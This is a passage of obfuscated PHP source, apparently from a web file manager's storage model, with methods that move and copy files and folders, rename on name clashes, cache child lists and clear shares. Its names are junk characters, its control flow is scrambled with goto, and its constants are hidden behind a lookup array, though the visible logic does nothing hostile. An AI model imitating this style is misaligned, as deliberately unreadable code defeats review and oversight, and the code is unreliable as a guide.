return $c½İèµÖÀ; } goto f‰Ø‚ãâ²ï; BÚŒâ ÕƒÓ: $this->addAll($D·§´ªØÌñ, array(), !1); $Dù„Å½…ƒ = $this->where(array($fÔïòâÅ¹…[478] => $c½İèµÖÀ))->select(); $d„ÉÚÚË = $this->_childrenMakeRelation($B—Ì‡Ô»„ğ, $Dù„Å½…ƒ); goto EÂ—Âì™†¹; F±ºÈî Ş„: $c½İèµÖÀ = $this->add($fô ñÔ£‹); $AÛÙ…µ†Ê = array($fÔïòâÅ¹…[395] => $c½İèµÖÀ, $fÔïòâÅ¹…[28] => $EÙŸ¿æøÎ§); $this->_copyApplyMeta($AÛÙ…µ†Ê, $fÔ¾Î²ºòÀ); goto fÇ†«òïÍ; fƒ—Ø‹¬åê: } private function _childrenMakeRelation($cÈÇ³ö“¢, $aŸ£Ïõíå) { $bÙ²¡„Õ‹¸ =& $_SERVER[ä°„ä°º]; $dÖÕ¾­‹Ş» = array(); $c¼âÓ“‰¹ª = array(); foreach ($cÈÇ³ö“¢ as $b÷·±Íâ™Ş) { $cÄ‚ÇÖ¹‹» = $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[28]] . $bÙ²¡„Õ‹¸[8] . $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[502]]; $dÖÕ¾­‹Ş»[$cÄ‚ÇÖ¹‹»] = $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[395]]; } foreach ($aŸ£Ïõíå as $b÷·±Íâ™Ş) { $cÄ‚ÇÖ¹‹» = $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[28]] . $bÙ²¡„Õ‹¸[8] . $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[502]]; $F…óµİ±ìö = $dÖÕ¾­‹Ş»[$cÄ‚ÇÖ¹‹»]; $c¼âÓ“‰¹ª[$F…óµİ±ìö] = $b÷·±Íâ™Ş[$bÙ²¡„Õ‹¸[395]]; } return $c¼âÓ“‰¹ª; } private function _childrenMatch($bÛÉìîöÆ, $fßÈÉ’¡çÆ, $A¸çãçŠ ™) { goto CŒòëÆÄø; CŒòëÆÄø: $d¹”¶®’ÙŸ =& $_SERVER[ä°„ä°º]; $e´¬ñ ²‰ = $A¸çãçŠ ™[$d¹”¶®’ÙŸ[502]]; $d‡İÅñš = $this->parentLevelArray($fßÈÉ’¡çÆ[$d¹”¶®’ÙŸ[502]]); goto a•¹±‰™˜ù; eš¿‰ëÚÃù: $cáêË‹ñÛ† = $D‹Õ¨ÈÒºÇ[count($D‹Õ¨ÈÒºÇ) - 1]; return array($d¹”¶®’ÙŸ[478] => $cáêË‹ñÛ†, $d¹”¶®’ÙŸ[502] => $e´¬ñ ²‰); goto Fİòé¼¨¤´; a•¹±‰™˜ù: foreach ($d‡İÅñš as $c¯É‚”ÀÀ”) { if (isset($bÛÉìîöÆ[$c¯É‚”ÀÀ”])) { $e´¬ñ ²‰ .= $bÛÉìîöÆ[$c¯É‚”ÀÀ”] . $d¹”¶®’ÙŸ[558]; } } $e´¬ñ ²‰ = rtrim($e´¬ñ ²‰, $d¹”¶®’ÙŸ[47]) . $d¹”¶®’ÙŸ[47]; $D‹Õ¨ÈÒºÇ = $this->parentLevelArray($e´¬ñ ²‰); goto eš¿‰ëÚÃù; Fİòé¼¨¤´: } private function _makeItemData($cçÃõµÓ‹, $b¢Õ¨ÕÅÄ, $A‡‹˜ò³¦Ï) { $e‰§«½‘ÂÜ =& $_SERVER[ä°„ä°º]; $Aß†½åÓëÌ = array($e‰§«½‘ÂÜ[559] => $cçÃõµÓ‹[$e‰§«½‘ÂÜ[403]], $e‰§«½‘ÂÜ[413] => $A‡‹˜ò³¦Ï, $e‰§«½‘ÂÜ[560] => $cçÃõµÓ‹[$e‰§«½‘ÂÜ[405]], $e‰§«½‘ÂÜ[448] => $cçÃõµÓ‹[$e‰§«½‘ÂÜ[447]], $e‰§«½‘ÂÜ[561] => $cçÃõµÓ‹[$e‰§«½‘ÂÜ[78]], $e‰§«½‘ÂÜ[562] => $b¢Õ¨ÕÅÄ[$e‰§«½‘ÂÜ[404]], $e‰§«½‘ÂÜ[563] => $b¢Õ¨ÕÅÄ[$e‰§«½‘ÂÜ[484]], $e‰§«½‘ÂÜ[564] => USER_ID, $e‰§«½‘ÂÜ[565] => USER_ID, $e‰§«½‘ÂÜ[394] => $b¢Õ¨ÕÅÄ[$e‰§«½‘ÂÜ[395]], $e‰§«½‘ÂÜ[566] => $b¢Õ¨ÕÅÄ[$e‰§«½‘ÂÜ[502]] . $b¢Õ¨ÕÅÄ[$e‰§«½‘ÂÜ[395]] . $e‰§«½‘ÂÜ[47], $e‰§«½‘ÂÜ[417] => $cçÃõµÓ‹[$e‰§«½‘ÂÜ[84]], $e‰§«½‘ÂÜ[422] => 0, $e‰§«½‘ÂÜ[567] => $e‰§«½‘ÂÜ[33]); return $Aß†½åÓëÌ; } private function _copyApplyMeta($B§ğ‰®ˆƒ, &$FË„Ë·Á†¼) { $Cï¼„Üø”Ş =& $_SERVER[ä°„ä°º]; $CÉîÎìÃ¾ç = $B§ğ‰®ˆƒ[$Cï¼„Üø”Ş[395]]; $Cìîáé¶• = $B§ğ‰®ˆƒ[$Cï¼„Üø”Ş[28]]; if (!isset($B§ğ‰®ˆƒ[$Cï¼„Üø”Ş[568]]) || !$B§ğ‰®ˆƒ[$Cï¼„Üø”Ş[568]] || $B§ğ‰®ˆƒ[$Cï¼„Üø”Ş[568]] == $Cï¼„Üø”Ş[191]) { $FË„Ë·Á†¼[$Cï¼„Üø”Ş[544]][] = array($Cï¼„Üø”Ş[395], $CÉîÎìÃ¾ç, $Cï¼„Üø”Ş[568], short_id($CÉîÎìÃ¾ç)); } if (Input::check($Cìîáé¶•, $Cï¼„Üø”Ş[569])) { $FË„Ë·Á†¼[$Cï¼„Üø”Ş[543]][] = array($Cï¼„Üø”Ş[395] => $CÉîÎìÃ¾ç, $Cï¼„Üø”Ş[93] => $Cï¼„Üø”Ş[444], $Cï¼„Üø”Ş[372] => str_replace($Cï¼„Üø”Ş[50], $Cï¼„Üø”Ş[33], Pinyin::encode($Cìîáé¶•))); $FË„Ë·Á†¼[$Cï¼„Üø”Ş[543]][] = array($Cï¼„Üø”Ş[395] => $CÉîÎìÃ¾ç, $Cï¼„Üø”Ş[93] => $Cï¼„Üø”Ş[443], $Cï¼„Üø”Ş[372] => Pinyin::encode($Cìîáé¶•, $Cï¼„Üø”Ş[570])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($aå®‡‘©é) { goto cŸáœÀÎåÕ; dšöƒÙÙŞ¡: $Bë³ÑœÁ¨ø = array($fÛõÑÚÇ¼´[502] => array($fÛõÑÚÇ¼´[525], $AæŞ‚“ğ‰Õ[$fÛõÑÚÇ¼´[502]] . $aå®‡‘©é . $fÛõÑÚÇ¼´[526]), $fÛõÑÚÇ¼´[423] => $this->targetIsDelete); $C ªÕêØ· = $this->field($E…šø¶”°‘)->where($Bë³ÑœÁ¨ø)->select(); if (!$C ªÕêØ·) { return; } goto bÒÔ’´ÖÎ¦; bÒÔ’´ÖÎ¦: $C ªÕêØ· = array_to_keyvalue($C ªÕêØ·, $fÛõÑÚÇ¼´[395]); foreach ($C ªÕêØ· as $f “Ö¸Š²) { $CŞ¾‹‘‡Ü = $f “Ö¸Š²[$fÛõÑÚÇ¼´[478]]; $aå®‡‘©é = $f “Ö¸Š²[$fÛõÑÚÇ¼´[395]]; if (!isset($this->_childrenListCache[$aå®‡‘©é]) && $f “Ö¸Š²[$fÛõÑÚÇ¼´[403]] == $fÛõÑÚÇ¼´[87]) { $this->_childrenListCache[$aå®‡‘©é] = array(); } if (!isset($this->_childrenListCache[$CŞ¾‹‘‡Ü])) { $this->_childrenListCache[$CŞ¾‹‘‡Ü] = array(); } $this->_childrenListCache[$CŞ¾‹‘‡Ü][$aå®‡‘©é] = $f “Ö¸Š²; $this->_childrenItemCache[$aå®‡‘©é] = $f “Ö¸Š²; } goto cğ†‰Á¼åŸ; cŸáœÀÎåÕ: $fÛõÑÚÇ¼´ =& $_SERVER[ä°„ä°º]; $AæŞ‚“ğ‰Õ = $this->sourceInfo($aå®‡‘©é); $E…šø¶”°‘ = $fÛõÑÚÇ¼´[424]; goto dšöƒÙÙŞ¡; cğ†‰Á¼åŸ: } private function _childrenListAll($f†íÍ¬ÅˆÆ, &$B…‰ÙìôÀè) { $Bğùß¬…â =& $_SERVER[ä°„ä°º]; if (!isset($this->_childrenListCache[$f†íÍ¬ÅˆÆ])) { return; } $cµ¿ÓË‰¡ = $this->_childrenListCache[$f†íÍ¬ÅˆÆ]; foreach ($cµ¿ÓË‰¡ as $f†ø•ğæÇ¦ => $f‚Ï¶²ˆ) { $B…‰ÙìôÀè[$f†ø•ğæÇ¦] = $f‚Ï¶²ˆ; if ($f‚Ï¶²ˆ[$Bğùß¬…â[403]] == $Bğùß¬…â[87]) { $this->_childrenListAll($f†ø•ğæÇ¦, $B…‰ÙìôÀè); } } } private function sourceInfoCache($A£î…ˆ´å¾) { if (isset($this->_childrenItemCache[$A£î…ˆ´å¾])) { return $this->_childrenItemCache[$A£î…ˆ´å¾]; } return $this->sourceInfo($A£î…ˆ´å¾); } private function _childrenList($A˜”ˆªÓ¶¾) { if (isset($this->_childrenListCache[$A˜”ˆªÓ¶¾])) { return $this->_childrenListCache[$A˜”ˆªÓ¶¾]; } return $this->_childrenListSelect($A˜”ˆªÓ¶¾); } private function _childrenListSelect($dØ§«å‰…) { goto eÓˆ¼Ó‚¾®; eÓˆ¼Ó‚¾®: $A¤Øºâ˜„ =& $_SERVER[ä°„ä°º]; $a¹‘›…ó¯Ï = array($A¤Øºâ˜„[478] => $dØ§«å‰…, $A¤Øºâ˜„[423] => $this->targetIsDelete); $c³ë½¸”ç¿ = $this->where($a¹‘›…ó¯Ï)->select(); goto b¿¬Â„™¥­; b¿¬Â„™¥­: $c³ë½¸”ç¿ = $c³ë½¸”ç¿ ? $c³ë½¸”ç¿ : array(); $FÜ…½Í¯— = array_to_keyvalue($c³ë½¸”ç¿, $A¤Øºâ˜„[395]); $this->_childrenListCache[$dØ§«å‰…] = $FÜ…½Í¯—; goto Eó½±ÁƒàÀ; Eó½±ÁƒàÀ: foreach ($FÜ…½Í¯— as $dØ§«å‰… => $Dßâ„ñ²š) { $this->_childrenItemCache[$dØ§«å‰…] = $Dßâ„ñ²š; } return $FÜ…½Í¯—; goto cÂ¬‹ß¾¤Ô; cÂ¬‹ß¾¤Ô: } private function fileNameExistCache($f¼åÓèã¤é, $bÀÄàåì‰ù) { $C¾ŞÛèö =& $_SERVER[ä°„ä°º]; $bÀÄàåì‰ù = strtolower($bÀÄàåì‰ù); $Cê›çÆÎÒ = $this->_childrenList($f¼åÓèã¤é); foreach ($Cê›çÆÎÒ as $F„˜ğ«¾ù) { if ($bÀÄàåì‰ù == strtolower($F„˜ğ«¾ù[$C¾ŞÛèö[28]])) { return $F„˜ğ«¾ù[$C¾ŞÛèö[395]]; } } return !1; } private function fileNameAutoCache($F¾Î²‘Çøó, $FœÛ¥„ØŞº, $AÏñ„­‰Ëô, $BË¾šœ„ÁË) { $eÂ§¦êì› =& $_SERVER[ä°„ä°º]; $E·©ÃÛµÜ¨ = $this->_childrenList($F¾Î²‘Çøó); $e‹…‘ÄÒØ = array_to_keyvalue($E·©ÃÛµÜ¨, $eÂ§¦êì›[33], $eÂ§¦êì›[28]); return $this->fileNameAutoGet($e‹…‘ÄÒØ, $FœÛ¥„ØŞº, $AÏñ„­‰Ëô, $BË¾šœ„ÁË); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($D¾õå•£¾¼, $B”ˆ‘ø½æË, $D¢ğ­ÆÇÊ£ = REPEAT_REPLACE, $CÅĞò×›‰÷ = '') { goto e…Œ‚”™¼†; Aï‰Õá‰Ï²: $this->updateModifyTime($aø®À¾ŠÃ°); Model($D¸¸ÌÛŒ³Â[546])->eventMove($D¾õå•£¾¼, $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[478]], $B”ˆ‘ø½æË); Hook::trigger($D¸¸ÌÛŒ³Â[572], $Dƒß¤øÇÇ®); goto fÓ Ø…ù´; fÓ Ø…ù´: return $bƒ²¢™†²; goto DÍ÷ŒÔá; e…Œ‚”™¼†: $D¸¸ÌÛŒ³Â =& $_SERVER[ä°„ä°º]; $CŠ¿ÎË¯¯Ö = $this->sourceInfo($D¾õå•£¾¼); $Dµ¼°³ÃŒĞ = $this->sourceInfo($B”ˆ‘ø½æË); goto F”Ò”á³Åİ; D•ˆÅ†”¯: if ($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[478]] == $B”ˆ‘ø½æË && $CÅĞò×›‰÷ != $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[28]]) { $bêíÏÖÜÛ× = $this->fileNameExist($B”ˆ‘ø½æË, $CÅĞò×›‰÷); if ($bêíÏÖÜÛ× && $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[403]] == $D¸¸ÌÛŒ³Â[191]) { goto a´Ì¿¼½½; a´Ì¿¼½½: $e‘àÖ‚²ˆ = $this->sourceInfo($bêíÏÖÜÛ×); $d»¨î³µã = $this->fileHistory($e‘àÖ‚²ˆ, $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[447]], $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[78]]); if (!$d»¨î³µã) { Model($D¸¸ÌÛŒ³Â[450])->remove($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[447]]); } goto Dô¹³¥Ÿ; Dô¹³¥Ÿ: $this->removeNow($D¾õå•£¾¼, !1); $this->folderSizeReset($B”ˆ‘ø½æË); Hook::trigger($D¸¸ÌÛŒ³Â[572], $Dƒß¤øÇÇ®); goto cë›¯š°İ£; cë›¯š°İ£: return $bêíÏÖÜÛ×; goto DŒòÃÕ³‹œ; DŒòÃÕ³‹œ: } } $cËÙË¶Ö’Ê = $CÅĞò×›‰÷ ? $CÅĞò×›‰÷ : $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[28]]; $this->lockMoveStart($D¾õå•£¾¼); goto eãäŸãÉáƒ; eãäŸãÉáƒ: $this->lockWriteStart($B”ˆ‘ø½æË, $cËÙË¶Ö’Ê); $AÄ‘È‚±–Ş = array($D¸¸ÌÛŒ³Â[542] => array(), $D¸¸ÌÛŒ³Â[573] => !1); $this->clearShare($D¾õå•£¾¼, $B”ˆ‘ø½æË); goto c¹–ŠğÁõî; c¹–ŠğÁõî: $eÜñ¾àªÂ” = $this->fileNameExistCache($B”ˆ‘ø½æË, $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[28]]); $bƒ²¢™†² = $this->_move($D¾õå•£¾¼, $B”ˆ‘ø½æË, $D¢ğ­ÆÇÊ£, $AÄ‘È‚±–Ş, $CÅĞò×›‰÷); $this->sourceCacheClear(); goto f¡ÍíŞ³±±; f¡ÍíŞ³±±: if ($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[403]] == $D¸¸ÌÛŒ³Â[87] && $eÜñ¾àªÂ”) { $this->folderSizeResetChildren($bƒ²¢™†²); } Model($D¸¸ÌÛŒ³Â[193])->linkAdd($AÄ‘È‚±–Ş[$D¸¸ÌÛŒ³Â[542]]); if ($eÜñ¾àªÂ” && $AÄ‘È‚±–Ş[$D¸¸ÌÛŒ³Â[573]]) { $this->removeNow($D¾õå•£¾¼, !1); } goto bµ”ÎàÇÆ›; bµ”ÎàÇÆ›: $this->lockMoveEnd($D¾õå•£¾¼); $this->lockWriteEnd($B”ˆ‘ø½æË, $cËÙË¶Ö’Ê); $this->folderSizeReset($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[478]]); goto c‡È˜ÍÇÚ; F”Ò”á³Åİ: if ($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[478]] == $Dµ¼°³ÃŒĞ[$D¸¸ÌÛŒ³Â[395]]) { if ($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[423]] == $D¸¸ÌÛŒ³Â[87]) { Model($D¸¸ÌÛŒ³Â[421])->restore(array($D¾õå•£¾¼)); } if (!$CÅĞò×›‰÷ || $CÅĞò×›‰÷ == $CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[28]]) { return $D¾õå•£¾¼; } } $Dƒß¤øÇÇ® = $this->pathInfoMore($D¾õå•£¾¼); if ($this->isParentOf($D¾õå•£¾¼, $B”ˆ‘ø½æË)) { return !1; } goto b­ŠÔ£¢í; b­ŠÔ£¢í: if (!$CŠ¿ÎË¯¯Ö || !$Dµ¼°³ÃŒĞ || $Dµ¼°³ÃŒĞ[$D¸¸ÌÛŒ³Â[403]] != $D¸¸ÌÛŒ³Â[87]) { return !1; } Hook::trigger($D¸¸ÌÛŒ³Â[571], $Dƒß¤øÇÇ®); $this->targetIsDelete = intval($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[423]]); goto D•ˆÅ†”¯; c‡È˜ÍÇÚ: $this->folderSizeReset($B”ˆ‘ø½æË); $aø®À¾ŠÃ° = array($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[478]], $B”ˆ‘ø½æË); if ($CŠ¿ÎË¯¯Ö[$D¸¸ÌÛŒ³Â[403]] == $D¸¸ÌÛŒ³Â[87]) { $aø®À¾ŠÃ°[] = $D¾õå•£¾¼; } goto Aï‰Õá‰Ï²; DÍ÷ŒÔá: } private function _move($dæÂÖ•«ß, $DğÈÁ‰Ó§„, $c Œ±öî±·, &$dÌ„¦¾ƒŒ¼, $d÷¥·õ´³Š = '') { goto d…†ÃÙ»¡œ; d…†ÃÙ»¡œ: $BóƒÔñÜä¯ =& $_SERVER[ä°„ä°º]; $F¡†æù±ˆ = $this->sourceInfo($dæÂÖ•«ß); $FóËïÀ‰âÛ = $F¡†æù±ˆ[$BóƒÔñÜä¯[403]] == $BóƒÔñÜä¯[87]; goto Eˆ‚Ìª™Œù; C­ÂÅŠĞ‚¤: $a„—ò»Ä = !1; if ($FóËïÀ‰âÛ) { if ($c Œ±öî±· == REPEAT_RENAME_FOLDER) { $aøÛéè—£Ÿ = $this->fileNameAuto($DğÈÁ‰Ó§„, $aøÛéè—£Ÿ, $c Œ±öî±·, $FóËïÀ‰âÛ); $eÖÍ¯¾¥ÑÄ = $this->_moveForce($dæÂÖ•«ß, $DğÈÁ‰Ó§„, $aøÛéè—£Ÿ); } else { if ($c Œ±öî±· == REPEAT_RENAME_FOLDER) { $c Œ±öî±· = REPEAT_RENAME; } $A§ğù’Ø† = $this->_childrenListSelect($dæÂÖ•«ß); foreach ($A§ğù’Ø† as $A·ßå„ò ¨) { $this->_move($A·ßå„ò ¨[$BóƒÔñÜä¯[395]], $e©ä†¿¦Œó, $c Œ±öî±·, $dÌ„¦¾ƒŒ¼); } $a„—ò»Ä = !0; } } else { if ($c Œ±öî±· == REPEAT_SKIP) { $a„—ò»Ä = !0; } else { if ($c Œ±öî±· == REPEAT_RENAME || $c Œ±öî±· == REPEAT_RENAME_FOLDER) { $aøÛéè—£Ÿ = $this->fileNameAuto($DğÈÁ‰Ó§„, $aøÛéè—£Ÿ, $c Œ±öî±·, $FóËïÀ‰âÛ); $eÖÍ¯¾¥ÑÄ = $this->_moveForce($dæÂÖ•«ß, $DğÈÁ‰Ó§„, $aøÛéè—£Ÿ); } else { if ($c Œ±öî±· == REPEAT_REPLACE) { $AñØ®ø°Äç = $this->sourceInfoCache($e©ä†¿¦Œó); $D°ÂÙ™£Ìİ = $this->fileHistory($AñØ®ø°Äç, $F¡†æù±ˆ[$BóƒÔñÜä¯[447]], $F¡†æù±ˆ[$BóƒÔñÜä¯[78]]); if ($D°ÂÙ™£Ìİ) { $dÌ„¦¾ƒŒ¼[$BóƒÔñÜä¯[542]][] = $F¡†æù±ˆ[$BóƒÔñÜä¯[447]]; } else { $a„—ò»Ä = !0; } } } } } if ($a„—ò»Ä && !$dÌ„¦¾ƒŒ¼[$BóƒÔñÜä¯[573]]) { $dÌ„¦¾ƒŒ¼[$BóƒÔñÜä¯[573]] = !0; } goto Eƒİ¯£ÁÜÌ; Eƒİ¯£ÁÜÌ: return $eÖÍ¯¾¥ÑÄ; goto B³©ğƒ¸š¤; Eˆ‚Ìª™Œù: $aøÛéè—£Ÿ = $d÷¥·õ´³Š ? $d÷¥·õ´³Š : $F¡†æù±ˆ[$BóƒÔñÜä¯[28]]; $e©ä†¿¦Œó = $this->fileNameExistCache($DğÈÁ‰Ó§„, $aøÛéè—£Ÿ); $this->lockMoveStart($dæÂÖ•«ß); goto FŸÜÍ­¹ØÒ; FŸÜÍ­¹ØÒ: $this->lockWriteStart($DğÈÁ‰Ó§„, $aøÛéè—£Ÿ); if (!$e©ä†¿¦Œó) { return $this->_moveForce($dæÂÖ•«ß, $DğÈÁ‰Ó§„, $aøÛéè—£Ÿ); } $eÖÍ¯¾¥ÑÄ = $e©ä†¿¦Œó; goto C­ÂÅŠĞ‚¤; B³©ğƒ¸š¤: } private function _moveForce($bŸ¶‡ñÕïƒ, $A£œÃÔöè©, $D•¿±˜‘ğò) { goto Eœ«¢ø‚ƒ—; Aí³ÑÉ­Ì: $cª‹ƒ—¬‹ = $Cªªêø‰Œ[$b‘Ï÷¹â[403]] == $b‘Ï÷¹â[87]; $f´áêÓ¿ˆ¶ = array($b‘Ï÷¹â[394] => $BÍÓƒåš¿[$b‘Ï÷¹â[395]], $b‘Ï÷¹â[566] => $BÍÓƒåš¿[$b‘Ï÷¹â[502]] . $BÍÓƒåš¿[$b‘Ï÷¹â[395]] . $b‘Ï÷¹â[47], $b‘Ï÷¹â[562] => $BÍÓƒåš¿[$b‘Ï÷¹â[404]], $b‘Ï÷¹â[563] => $BÍÓƒåš¿[$b‘Ï÷¹â[484]], $b‘Ï÷¹â[565] => USER_ID, $b‘Ï÷¹â[413] => $D•¿±˜‘ğò); $dÙ¡Ğæ‘´÷ = $Cªªêø‰Œ[$b‘Ï÷¹â[404]] == SourceModel::TYPE_GROUP && $BÍÓƒåš¿[$b‘Ï÷¹â[404]] == SourceModel::TYPE_GROUP && $Cªªêø‰Œ[$b‘Ï÷¹â[484]] == $BÍÓƒåš¿[$b‘Ï÷¹â[484]]; goto e—´ØÏºÍ×; e—´ØÏºÍ×: if (!$dÙ¡Ğæ‘´÷ && $this->moveClearAuth) { Model($b‘Ï÷¹â[482])->authClear($bŸ¶‡ñÕïƒ); } $f÷êÂ°Ûé = $Cªªêø‰Œ[$b‘Ï÷¹â[423]] == $b‘Ï÷¹â[87] && $BÍÓƒåš¿[$b‘Ï÷¹â[423]] != $b‘Ï÷¹â[87]; if ($f÷êÂ°Ûé) { $f´áêÓ¿ˆ¶[$b‘Ï÷¹â[422]] = 0; } goto CØä‰ÛÊÎ†; Eœ«¢ø‚ƒ—: $b‘Ï÷¹â =& $_SERVER[ä°„ä°º]; $Cªªêø‰Œ = $this->sourceInfo($bŸ¶‡ñÕïƒ); $BÍÓƒåš¿ = $this->sourceInfo($A£œÃÔöè©); goto Aí³ÑÉ­Ì; CØä‰ÛÊÎ†: if ($cª‹ƒ—¬‹) { $céÕ¸½ĞÑ• = array($b‘Ï÷¹â[566] => array($b‘Ï÷¹â[525], $Cªªêø‰Œ[$b‘Ï÷¹â[502]] . $Cªªêø‰Œ[$b‘Ï÷¹â[395]] . $b‘Ï÷¹â[526])); $fšÏÁĞº¨ˆ = $Cªªêø‰Œ[$b‘Ï÷¹â[502]] . $Cªªêø‰Œ[$b‘Ï÷¹â[395]] . $b‘Ï÷¹â[47]; $eÖç¦æÃğÅ = $BÍÓƒåš¿[$b‘Ï÷¹â[502]] . $BÍÓƒåš¿[$b‘Ï÷¹â[395]] . $b‘Ï÷¹â[47] . $Cªªêø‰Œ[$b‘Ï÷¹â[395]] . $b‘Ï÷¹â[47]; $a¦çÃ°“Œ = array($b‘Ï÷¹â[566] => array($b‘Ï÷¹â[574], "\162\x65\160\154\141\x63\145\x28\160\x61\162\x65\156\x74\114\x65\x76\145\x6c\x2c\x27{$fšÏÁĞº¨ˆ}\47\54\47{$eÖç¦æÃğÅ}\x27\51"), $b‘Ï÷¹â[562] => $BÍÓƒåš¿[$b‘Ï÷¹â[404]], $b‘Ï÷¹â[563] => $BÍÓƒåš¿[$b‘Ï÷¹â[484]]); if ($f÷êÂ°Ûé) { $a¦çÃ°“Œ[$b‘Ï÷¹â[422]] = 0; } $this->where($céÕ¸½ĞÑ•)->data($a¦çÃ°“Œ)->save(); } $this->where(array($b‘Ï÷¹â[410] => $bŸ¶‡ñÕïƒ))->data($f´áêÓ¿ˆ¶)->save(); return $bŸ¶‡ñÕïƒ; goto eõ™ùƒ²õ; eõ™ùƒ²õ: } private function clearShare($Dù„ê©¤¬„, $e¼«‡®ñÎº) { goto BïèÇÊ–Ò­; cš­Ä™¡ÕÆ: if (!$E£éŠ£§˜) { return; } $E£éŠ£§˜ = array_to_keyvalue($E£éŠ£§˜, $a÷¤¿ğ×Ÿò[33], $a÷¤¿ğ×Ÿò[468]); $b®¨¼•ÃÈà = array($a÷¤¿ğ×Ÿò[468] => array($a÷¤¿ğ×Ÿò[7], $E£éŠ£§˜)); goto aŠ“‘¡°“´; D£ù­÷Ò•ó: if ($D»åŠôæËÎ[$a÷¤¿ğ×Ÿò[484]] == $d¸Û«ï‡©É[$a÷¤¿ğ×Ÿò[484]] && $D»åŠôæËÎ[$a÷¤¿ğ×Ÿò[404]] == $a÷¤¿ğ×Ÿò[575]) { return; } $b®¨¼•ÃÈà = array($a÷¤¿ğ×Ÿò[502] => array($a÷¤¿ğ×Ÿò[525], $D»åŠôæËÎ[$a÷¤¿ğ×Ÿò[502]] . $Dù„ê©¤¬„ . $a÷¤¿ğ×Ÿò[526])); $Dã£§ÆÈ¯‹ = $this->field($a÷¤¿ğ×Ÿò[410])->where($b®¨¼•ÃÈà)->getField($a÷¤¿ğ×Ÿò[395], !0); goto C‰©Õ†õ¸; C‰©Õ†õ¸: if (!$Dã£§ÆÈ¯‹) { return; } $b®¨¼•ÃÈà = array($a÷¤¿ğ×Ÿò[395] => array($a÷¤¿ğ×Ÿò[7], $Dã£§ÆÈ¯‹), $a÷¤¿ğ×Ÿò[475] => 1); $E£éŠ£§˜ = Model($a÷¤¿ğ×Ÿò[576])->field($a÷¤¿ğ×Ÿò[468])->where($b®¨¼•ÃÈà)->select(); goto cš­Ä™¡ÕÆ; aŠ“‘¡°“´: Model($a÷¤¿ğ×Ÿò[576])->where($b®¨¼•ÃÈà)->save(array($a÷¤¿ğ×Ÿò[475] => 0)); Model($a÷¤¿ğ×Ÿò[577])->where($b®¨¼•ÃÈà)->delete(); goto D™è‰‘ÛŞØ; BïèÇÊ–Ò­: $a÷¤¿ğ×Ÿò =& $_SERVER[ä°„ä°º]; $D»åŠôæËÎ = $this->sourceInfo($Dù„ê©¤¬„); $d¸Û«ï‡©É = $this->sourceInfo($e¼«‡®ñÎº); goto D£ù­÷Ò•ó; D™è‰‘ÛŞØ: } public function copyFolderFromIO($cí³šÙÌ, $CĞÎ‚à¨Ëˆ, $fã¦ÉùŠñ¦, $cö½Ÿ×•Ö, $C­„›Í•­, $c¹ñš„ªà» = false) { goto c¥­ğøöµ­; C¿±Ä¤Í—ƒ: Model($eµ¼š™Üö[545])->addAll($dÇµ®ö³œ[$eµ¼š™Üö[543]], array(), !0); Model($eµ¼š™Üö[546])->eventCopy($bÕÖ´«²¾); $this->saveAll($dÇµ®ö³œ[$eµ¼š™Üö[544]]); goto AçĞ×Àˆ„Ó; eñ§Š¹Ô¾£: Hook::trigger($eµ¼š™Üö[580]); if ($bÕÖ´«²¾) { $this->folderSizeResetChildren($bÕÖ´«²¾); } $this->_childrenListClear(); goto C¿±Ä¤Í—ƒ; A›²¥ÉÊ£: $this->updateModifyTime($fã¦ÉùŠñ¦); return $bÕÖ´«²¾; goto c·Ù„Õ¾İÖ; CàòÅ§ÛØ: $F—Îœï¨öæ = $this->fileNameExist($fã¦ÉùŠñ¦, $cÍ”œ¾÷¹É); $bÕÖ´«²¾ = $this->mkdir($fã¦ÉùŠñ¦, $cÍ”œ¾÷¹É, $cö½Ÿ×•Ö); if (!$F—Îœï¨öæ || $cö½Ÿ×•Ö == REPEAT_RENAME_FOLDER) { $cö½Ÿ×•Ö = !1; } goto e¾–ŠÂ‡à; c¥­ğøöµ­: $eµ¼š™Üö =& $_SERVER[ä°„ä°º]; $dÇµ®ö³œ = array($eµ¼š™Üö[543] => array(), $eµ¼š™Üö[544] => array(), $eµ¼š™Üö[542] => array(), $eµ¼š™Üö[578] => array()); $cÍ”œ¾÷¹É = $c¹ñš„ªà» ? $c¹ñš„ªà» : $cí³šÙÌ->pathThis($CĞÎ‚à¨Ëˆ); goto CàòÅ§ÛØ; AçĞ×Àˆ„Ó: Model($eµ¼š™Üö[450])->linkAdd($dÇµ®ö³œ[$eµ¼š™Üö[542]]); Model($eµ¼š™Üö[450])->remove($dÇµ®ö³œ[$eµ¼š™Üö[578]]); $this->folderSizeReset($fã¦ÉùŠñ¦); goto A›²¥ÉÊ£; e¾–ŠÂ‡à: if ($F—Îœï¨öæ) { $this->_childrenAllMake($F—Îœï¨öæ); } Hook::trigger($eµ¼š™Üö[579]); $this->_copyChildTo($cí³šÙÌ, $CĞÎ‚à¨Ëˆ, $bÕÖ´«²¾, $cö½Ÿ×•Ö, $dÇµ®ö³œ, $C­„›Í•­); goto eñ§Š¹Ô¾£; c·Ù„Õ¾İÖ: } private function 